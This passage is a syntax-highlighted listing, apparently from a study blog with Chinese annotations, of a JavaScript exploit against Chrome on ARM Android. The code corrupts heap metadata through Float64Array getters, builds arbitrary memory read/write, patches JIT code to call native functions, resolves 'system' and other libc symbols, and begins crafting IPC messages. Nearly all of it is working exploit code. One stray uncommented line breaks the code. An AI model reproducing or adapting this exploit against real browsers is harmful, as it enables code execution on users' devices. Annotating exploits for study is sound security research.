<span class="comment">//alert('creating pages');</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrays.length; i++) &#123;</span><br><span class="line">            createArray(<span class="number">0x20000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//alert('done');</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> j = <span class="number">0</span>;</span><br><span class="line">    hugetempl.__defineGetter__(bad, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// prev: whatever</span></span><br><span class="line">        <span class="comment">// head: 0x20 | PINUSE_BIT(1) | CINUSE_BIT(2)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">7.611564664e-313</span>;<span class="comment">//deadbeef 00000023,覆盖chunk的meta data，将其size由0x20000改为0x20。</span></span><br><span class="line">        <span class="comment">//在free之后，就会插入0x20 byte free-list的头部</span></span><br><span class="line">    &#125;);<span class="comment">//一页的最后</span></span><br><span class="line">    <span class="keyword">var</span> foundIt = <span class="literal">false</span>;</span><br><span class="line">    hugetempl[bad + <span class="number">1</span>] = <span class="number">2261634.5098039214</span>; <span class="comment">// overwrites </span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    在相邻的下一页开始的地方</span></span><br><span class="line"><span class="comment">    u2d</span></span><br><span class="line"><span class="comment">    sakura@sakuradeMacBook-Pro:~$ ./u2d 2261634.5098039214</span></span><br><span class="line"><span class="comment">    ########## mode2 ###########</span></span><br><span class="line"><span class="comment">    表示变换:(ull/ui -&gt; double/float)</span></span><br><span class="line"><span class="comment">    2261634.5098039214(2.261634509803921e+06 ) --d2ull-&gt; 0x4141414141414141</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    the beginning <span class="keyword">of</span> the array</span><br><span class="line">    hugetempl.__defineGetter__(bad + <span class="number">2</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; arraysI; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(arrays[j][<span class="number">0</span>] != <span class="number">0x42</span>) &#123;</span><br><span class="line">                <span class="comment">//alert('&lt;- ' + j + ': ' + arrays[j][0]);</span></span><br><span class="line">                replaceWithWTFArrayBuffer(arrays, j);</span><br><span class="line">                foundIt = <span class="literal">true</span>;</span><br><span class="line">                <span class="comment">// m_sizeInBytes=2^31-1 m_deallocationObserver=null</span></span><br><span class="line">                <span class="comment">// can't go higher because it gets treated as signed</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">1.060997895e-314</span>;</span><br><span class="line">                <span class="comment">//0.0000000000(1.060997894988571e-314) --d2ull-&gt; 0x000000007fffffff</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        alert(<span class="string">'No good.  Crashing Chrome for another try...'</span>);</span><br><span class="line">        crash();</span><br><span class="line">    &#125;);</span><br><span class="line">    hugetempl.__defineGetter__(bad + <span class="number">3</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">'ok'</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> huge = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(hugetempl);<span class="comment">//-&gt;触发</span></span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        <span class="keyword">if</span>(e == <span class="string">'ok'</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> lowView = <span class="literal">null</span>, highView = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rfunc</span>(<span class="params">prop</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'a'</span>,</span><br><span class="line">        <span class="string">'if(a &gt;= 0x80000000) '</span> +</span><br><span class="line">            <span class="string">'return highView.'</span> + prop + <span class="string">'(a - 0x80000000, true);'</span> +</span><br><span class="line">        <span class="string">'else '</span> +</span><br><span class="line">            <span class="string">'return lowView.'</span> + prop + <span class="string">'(a - 0x100, true);'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wfunc</span>(<span class="params">prop</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'a'</span>, <span class="string">'v'</span>,</span><br><span class="line">        <span class="string">'if(a &gt;= 0x80000000) '</span> +</span><br><span class="line">            <span class="string">'highView.'</span> + prop + <span class="string">'(a - 0x80000000, v, true);'</span> +</span><br><span class="line">        <span class="string">'else '</span> +</span><br><span class="line">            <span class="string">'lowView.'</span> + prop + <span class="string">'(a - 0x100, v, true);'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> read32 = rfunc(<span class="string">'getUint32'</span>);</span><br><span class="line"><span class="keyword">var</span> read8 = rfunc(<span class="string">'getUint8'</span>);</span><br><span class="line"><span class="keyword">var</span> write8 = wfunc(<span class="string">'setUint8'</span>);</span><br><span class="line"><span class="keyword">var</span> write32 = wfunc(<span class="string">'setUint32'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params">start, step, words</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> first = words[<span class="number">0</span>], second = words[<span class="number">1</span>];</span><br><span class="line">    outer:</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> a = start; ; a += step) &#123;</span><br><span class="line">        <span class="keyword">if</span>(read32(a) == first &amp;&amp; read32(a+<span class="number">4</span>) == second) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">2</span>; j &lt; words.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(read32(a + j*<span class="number">4</span>) != words[j])</span><br><span class="line">                    <span class="keyword">continue</span> outer;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blxDest</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val = read32(addr);</span><br><span class="line">    <span class="keyword">var</span> s = (val &amp; <span class="number">0x400</span>) &gt;&gt; <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">var</span> i1 = <span class="number">1</span> - (((val &amp; <span class="number">0x20000000</span>) &gt;&gt; <span class="number">29</span>) ^ s);</span><br><span class="line">    <span class="keyword">var</span> i2 = <span class="number">1</span> - (((val &amp; <span class="number">0x8000000</span>) &gt;&gt; <span class="number">27</span>) ^ s);</span><br><span class="line">    <span class="keyword">var</span> i10h = val &amp; <span class="number">0x3ff</span>;</span><br><span class="line">    <span class="keyword">var</span> i10l = (val &amp; <span class="number">0x7fe0000</span>) &gt;&gt; <span class="number">17</span>;</span><br><span class="line">    <span class="keyword">var</span> off = ((s * <span class="number">0xff</span>) &lt;&lt; <span class="number">24</span>) | (i1 &lt;&lt; <span class="number">23</span>) | (i2 &lt;&lt; <span class="number">22</span>) | (i10h &lt;&lt; <span class="number">12</span>) | (i10l &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> ((addr + <span class="number">4</span>) &amp; ~<span class="number">3</span>) + off;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ldrDest</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((addr + <span class="number">4</span>) &amp; ~<span class="number">3</span>) + <span class="number">4</span> * read8(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ldrAddPCDest</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr + <span class="number">2</span> + <span class="number">4</span> + read32(ldrDest(addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copystr</span>(<span class="params">p, s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; s.length; i++)</span><br><span class="line">        write8(p + i, s.charCodeAt(i));</span><br><span class="line">    write8(p + i, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NEGONE = <span class="number">0xffffffff</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params">func, a1, a2, a3, a4, a5, a6, a7, a8</span>) </span>&#123;</span><br><span class="line">    assert(func);</span><br><span class="line">    write32(callbuf + <span class="number">0x00</span>, a5);</span><br><span class="line">    write32(callbuf + <span class="number">0x04</span>, a6);</span><br><span class="line">    write32(callbuf + <span class="number">0x08</span>, a7);</span><br><span class="line">    write32(callbuf + <span class="number">0x0c</span>, a8);</span><br><span class="line">    write32(callbuf + <span class="number">0x10</span>, a1);</span><br><span class="line">    write32(callbuf + <span class="number">0x14</span>, a2);</span><br><span class="line">    write32(callbuf + <span class="number">0x18</span>, a3);</span><br><span class="line">    write32(callbuf + <span class="number">0x1c</span>, a4);</span><br><span class="line">    write32(callbuf + <span class="number">0x20</span>, func);</span><br><span class="line">    deadfunc(&#123;&#125;);</span><br><span class="line">    <span class="keyword">return</span> read32(callbuf + <span class="number">0x24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prepareForCalls</span>(<span class="params">buffer</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer, <span class="number">0</span>, buffer.byteLength);</span><br><span class="line">    <span class="keyword">if</span>(buffer.byteLength == <span class="number">0x7fffffff</span>) &#123;</span><br><span class="line">        lowView = dv;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highView = dv;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!(lowView &amp;&amp; highView)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    alert(<span class="string">'+2'</span>);</span><br><span class="line">    <span class="keyword">var</span> text = read32(vtable + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">var</span> dlsymmer = find((text &amp; ~<span class="number">1</span>) + <span class="number">0x900000</span>, <span class="number">2</span>,</span><br><span class="line">        [<span class="number">0x46204798</span>, <span class="number">0xc0d6f59c</span>, <span class="number">0x4038e8bd</span>, <span class="number">0xb9ddf000</span>, <span class="number">0x0422bf00</span>]);</span><br><span class="line">    dlsym_addr = blxDest(dlsymmer - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// This thing is probably the easiest way to be able to call functions with</span></span><br><span class="line">    <span class="comment">// arbitrarily many arguments.  It may turn out to be unnecessary if none</span></span><br><span class="line">    <span class="comment">// of the functions use that many arguments, but whatever...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> tdter = find(dlsymmer, <span class="number">2</span>, [<span class="number">0x0058f645</span>, <span class="number">0x601a6016</span>]);</span><br><span class="line">    <span class="keyword">var</span> thread_data_table_ptr = ldrAddPCDest(tdter - <span class="number">6</span>);</span><br><span class="line">    <span class="comment">//alert('tdter:' + asHex(tdter) + ' tdt:' + asHex(thread_data_table_));</span></span><br><span class="line">    <span class="keyword">var</span> thread_data_table_ = read32(thread_data_table_ptr);</span><br><span class="line">    <span class="keyword">var</span> list_ = read32(thread_data_table_);</span><br><span class="line">    <span class="keyword">var</span> isolate_ = read32(list_);</span><br><span class="line">    <span class="keyword">var</span> heap_ = isolate_ + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">var</span> lo_space_ = read32(heap_ + <span class="number">0x598</span>); <span class="comment">/* ! */</span></span><br><span class="line">    <span class="keyword">var</span> a = <span class="string">'eval("");'</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">40000</span>; i++) a += <span class="string">'a.a;'</span></span><br><span class="line">    a += <span class="string">'return 42;'</span>;</span><br><span class="line">    deadfunc = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'a'</span>, a);</span><br><span class="line">    deadfunc(&#123;&#125;);</span><br><span class="line">    <span class="keyword">var</span> first_page_ = read32(lo_space_ + <span class="number">0x14</span>);</span><br><span class="line">    <span class="keyword">var</span> area_start_ = read32(first_page_ + <span class="number">0x10</span>), area_end_ = read32(first_page_ + <span class="number">0x14</span>);</span><br><span class="line">    <span class="comment">//alert('los=' + asHex(lo_space_) + ' code=' + asHex(code));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    00000000    e92d4030        push    &#123;r4, r5, lr&#125;</span></span><br><span class="line"><span class="comment">    00000004    e59f5020        ldr     r5, [pc, #32]   ; 0x2c</span></span><br><span class="line"><span class="comment">    00000008    e8b5000f        ldm     r5!, &#123;r0, r1, r2, r3&#125;</span></span><br><span class="line"><span class="comment">    0000000c    e92d000f        push    &#123;r0, r1, r2, r3&#125;</span></span><br><span class="line"><span class="comment">    00000010    e8b5001f        ldm     r5!, &#123;r0, r1, r2, r3, r4&#125;</span></span><br><span class="line"><span class="comment">    00000014    e12fff34        blx     r4</span></span><br><span class="line"><span class="comment">    00000018    e5850000        str     r0, [r5]</span></span><br><span class="line"><span class="comment">    0000001c    e8bd403f        pop     &#123;r0, r1, r2, r3, r4, r5, lr&#125;</span></span><br><span class="line"><span class="comment">    00000020    e3a00000        mov     r0, #0  ; 0x0</span></span><br><span class="line"><span class="comment">    00000024    e3a01000        mov     r1, #0  ; 0x0</span></span><br><span class="line"><span class="comment">    00000028    e12fff1e        bx      lr</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">var</span> insts = [<span class="number">0xe92d4030</span>,<span class="number">0xe59f5020</span>,<span class="number">0xe8b5000f</span>,<span class="number">0xe92d000f</span>,<span class="number">0xe8b5001f</span>,<span class="number">0xe12fff34</span>,<span class="number">0xe5850000</span>,<span class="number">0xe8bd403f</span>,<span class="number">0xe3a00000</span>,<span class="number">0xe3a01000</span>,<span class="number">0xe12fff1e</span>, callbuf];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> a = area_start_; a &lt; area_end_; a += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>((read32(a) &amp; <span class="number">0xffff0000</span>) == (<span class="number">0xe92d0000</span> | <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; insts.length; i++)</span><br><span class="line">                write32(a + i * <span class="number">4</span>, insts[i]);</span><br><span class="line">            <span class="keyword">var</span> end = a + insts.length * <span class="number">4</span>;</span><br><span class="line">            insts[insts.length - <span class="number">1</span>] = callbuf + <span class="number">0x28</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; insts.length; i++)</span><br><span class="line">                write32(end + i * <span class="number">4</span>, insts[i]);</span><br><span class="line">            bxlr = end - <span class="number">8</span>;</span><br><span class="line">            stub2 = end;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a == area_end_) &#123;</span><br><span class="line">        alert(<span class="string">"didn't find push area="</span> + first_page_);</span><br><span class="line">        crash();</span><br><span class="line">    &#125;</span><br><span class="line">    write32(callbuf + <span class="number">0x20</span>, bxlr);</span><br><span class="line">    <span class="keyword">while</span>(deadfunc(&#123;&#125;) == <span class="number">42</span>);</span><br><span class="line">    <span class="comment">//alert('OK');</span></span><br><span class="line">    theFunPart();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assert</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!x) &#123;</span><br><span class="line">        <span class="keyword">var</span> errno = read32(call(funcs.__errno));</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Assertion failed; errno = '</span> + errno);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xerr = <span class="literal">null</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xassert</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!x &amp;&amp; !xerr) &#123;</span><br><span class="line">        xerr = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Assertion failed'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MInt</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        w: <span class="function"><span class="keyword">function</span>(<span class="params">buf</span>) </span>&#123;</span><br><span class="line">            write32(buf.addr, x);</span><br><span class="line">            buf.addr += <span class="number">4</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        r: <span class="function"><span class="keyword">function</span>(<span class="params">buf</span>) </span>&#123;</span><br><span class="line">            buf[x] = read32(buf.addr);</span><br><span class="line">            buf.addr += <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MFileDesc</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        r: <span class="function"><span class="keyword">function</span>(<span class="params">buf</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> valid = read32(buf.addr);</span><br><span class="line">            <span class="keyword">var</span> idx = read32(buf.addr + <span class="number">4</span>);</span><br><span class="line">            buf.addr += <span class="number">8</span>;</span><br><span class="line">            assert(valid);</span><br><span class="line">            assert(idx &lt; buf.fds.length);</span><br><span class="line">            buf[x] = buf.fds[idx];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">messageSend</span>(<span class="params">routing, type</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> base = scratch + <span class="number">0x100</span>;</span><br><span class="line">    <span class="keyword">var</span> buf = &#123;<span class="attr">addr</span>: base + <span class="number">4</span>&#125;;</span><br><span class="line">    MInt(routing).w(buf);</span><br><span class="line">    MInt(type).w(buf);</span><br><span class="line">    <span class="keyword">var</span> flags = <span class="number">0x80000002</span>, num_fds = <span class="number">0</span>;</span><br><span class="line">    MInt(flags).w(buf);</span><br><span class="line">    MInt(num_fds).w(buf);</span><br><span class="line">    <span class="keyword">var</span> payload_start = buf.addr;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">2</span>; i &lt; <span class="built_in">arguments</span>.length; i++)</span><br><span class="line">        <span class="built_in">arguments</span>[i].w(buf);</span><br><span class="line">    <span class="keyword">var</span> payload_size = buf.addr - payload_start;</span><br><span class="line">    write32(base, payload_size);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    assert(call(funcs.send, pipe_, base, buf.addr - base, <span class="number">0</span>) == buf.addr - base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log = <span class="string">''</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">messageReceive</span>(<span class="params">types</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">while</span>(n--) &#123;</span><br><span class="line">        <span class="keyword">var</span> base = scratch + <span class="number">0x100</span>;</span><br><span class="line">        call(funcs.memset, base, <span class="number">0xee</span>, <span class="number">0x200</span>);</span><br><span class="line">        <span class="keyword">var</span> len = call(funcs.recv, pipe_, base, <span class="number">4</span>, <span class="number">0</span>) | <span class="number">0</span>;</span><br><span class="line">        assert(len == <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">var</span> msg = &#123;<span class="attr">base</span>: base, <span class="attr">addr</span>: base&#125;;</span><br><span class="line">        MInt(<span class="string">'payload_size'</span>).r(msg);</span><br><span class="line">        <span class="keyword">var</span> len = msg.payload_size + <span class="number">0x10</span>;</span><br><span class="line">        assert(len &lt; <span class="number">0x1fc</span>);</span><br><span class="line">        assert(call(funcs.recv, pipe_, msg.addr, len, <span class="number">0</span>) == len);</span><br><span class="line">        readArgs(msg,</span><br><span class="line">            MInt(<span class="string">'routing'</span>),</span><br><span class="line">            MInt(<span class="string">'type'</span>),</span><br><span class="line">            MInt(<span class="string">'flags'</span>),</span><br><span class="line">            MInt(<span class="string">'num_fds'</span>));</span><br><span class="line">        <span class="keyword">if</span>(msg.num_fds &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            msg.fds = [];</span><br><span class="line">            <span class="keyword">var</span> msghdr = scratch + <span class="number">0xc00</span>;</span><br><span class="line">            <span class="keyword">var</span> iov = scratch + <span class="number">0xc20</span>;</span><br><span class="line">            <span class="keyword">var</span> control = scratch + <span class="number">0xc40</span>;</span><br><span class="line">            write32(msghdr + <span class="number">0x00</span>, <span class="number">0</span>); <span class="comment">// msg_name</span></span><br><span class="line">            write32(msghdr + <span class="number">0x04</span>, <span class="number">0</span>); <span class="comment">// msg_namelen</span></span><br><span class="line">            write32(msghdr + <span class="number">0x08</span>, iov); <span class="comment">// msg_iov</span></span><br><span class="line">            write32(msghdr + <span class="number">0x0c</span>, <span class="number">1</span>); <span class="comment">// msg_iovlen</span></span><br><span class="line">            write32(msghdr + <span class="number">0x10</span>, control); <span class="comment">// msg_control</span></span><br><span class="line">            write32(msghdr + <span class="number">0x14</span>, <span class="number">0x100</span>); <span class="comment">// msg_controllen</span></span><br><span class="line">            write32(msghdr + <span class="number">0x18</span>, <span class="number">0</span>); <span class="comment">// msg_flags</span></span><br><span class="line">            write32(iov + <span class="number">0</span>, scratch + <span class="number">0xc28</span>); <span class="comment">// iov_base</span></span><br><span class="line">            write32(iov + <span class="number">4</span>, <span class="number">1</span>); <span class="comment">// iov_len</span></span><br><span class="line">            assert(call(funcs.recvmsg, fd_pipe_, msghdr, <span class="number">0</span>) == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> controllen = read32(msghdr + <span class="number">0x14</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> cmsg = control; cmsg &lt; control + controllen; cmsg += (cmsg_len + <span class="number">3</span>) &amp; ~<span class="number">3</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> SOL_SOCKET = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">var</span> SCM_RIGHTS = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">var</span> cmsg_len = read32(cmsg);</span><br><span class="line">                <span class="keyword">var</span> cmsg_level = read32(cmsg+<span class="number">4</span>);</span><br><span class="line">                <span class="keyword">var</span> cmsg_type = read32(cmsg+<span class="number">8</span>);</span><br><span class="line">                <span class="keyword">if</span>(cmsg_level == SOL_SOCKET &amp;&amp; cmsg_type == SCM_RIGHTS) &#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">var</span> o = <span class="number">0xc</span>; o &lt; cmsg_len; o += <span class="number">4</span>)</span><br><span class="line">                        msg.fds.push(read32(cmsg + o));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            assert(msg.fds.length == msg.num_fds);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(types.indexOf(msg.type) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(msg.type != <span class="number">0x00010520</span>)</span><br><span class="line">                log += <span class="string">'spurious '</span> + asHex(msg.type) + <span class="string">'\n'</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"didn't receive desired message(s)"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readArgs</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; <span class="built_in">arguments</span>.length; i++)</span><br><span class="line">        <span class="built_in">arguments</span>[i].r(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">messageReceiveDone</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> end = msg.addr;</span><br><span class="line">    <span class="keyword">var</span> true_end = msg.base + <span class="number">20</span> + msg.payload_size;</span><br><span class="line">    <span class="keyword">if</span>(end != true_end)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'extra bytes: '</span> + (true_end - end));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setNonblock</span>(<span class="params">fd, on</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> F_SETFL = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">var</span> O_NONBLOCK = <span class="number">00004000</span>;</span><br><span class="line">    assert(call(funcs.fcntl, fd, F_SETFL, on ? O_NONBLOCK : <span class="number">0</span>) == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">theFunPart</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// A lot of this is relatively unnecessary guesswork</span></span><br><span class="line">    <span class="comment">// because I hate searching for symbols.</span></span><br><span class="line">    <span class="comment">// pause the main thread</span></span><br><span class="line">    <span class="keyword">var</span> SOL_SOCKET = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> SO_TYPE = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">var</span> syms = [</span><br><span class="line">        <span class="string">'getsockopt'</span>,</span><br><span class="line">        <span class="string">'write'</span>,</span><br><span class="line">        <span class="string">'send'</span>,</span><br><span class="line">        <span class="string">'recv'</span>,</span><br><span class="line">        <span class="string">'recvmsg'</span>,</span><br><span class="line">        <span class="string">'close'</span>,</span><br><span class="line">        <span class="string">'memset'</span>,</span><br><span class="line">        <span class="string">'malloc'</span>,</span><br><span class="line">        <span class="string">'__errno'</span>,</span><br><span class="line">        <span class="string">'fcntl'</span>,</span><br><span class="line">        <span class="string">'bsd_signal'</span>,</span><br><span class="line">        <span class="string">'tkill'</span>,</span><br><span class="line">        <span class="string">'getpid'</span>,</span><br><span class="line">        <span class="string">'gettid'</span>,</span><br><span class="line">        <span class="string">'futex'</span>,</span><br><span class="line">        <span class="string">'usleep'</span>,</span><br><span class="line">        <span class="string">'mmap'</span>,</span><br><span class="line">        <span class="string">'munmap'</span>,</span><br><span class="line">        <span class="string">'system'</span></span><br><span class="line">    ];</span><br><span class="line">    funcs = &#123;&#125;;</span><br><span class="line">    syms.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">sym</span>) </span>&#123;</span><br><span class="line">        funcs[sym] = dlsym(sym);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    scratch = call(funcs.malloc, <span class="number">0x1000</span>); <span class="comment">// no real need for yet another buffer, but I don't want to break anything</span></span><br><span class="line">    assert(scratch);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> mypid = call(funcs.getpid), mytid = call(funcs.gettid);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> sockets = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> fd = <span class="number">5</span>; fd &lt; <span class="number">100</span>; fd++) &#123;</span><br><span class="line">        write32(scratch + <span class="number">0x78</span>, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(call(funcs.getsockopt, fd, SOL_SOCKET, SO_TYPE, scratch + <span class="number">0x74</span>, scratch + <span class="number">0x78</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span 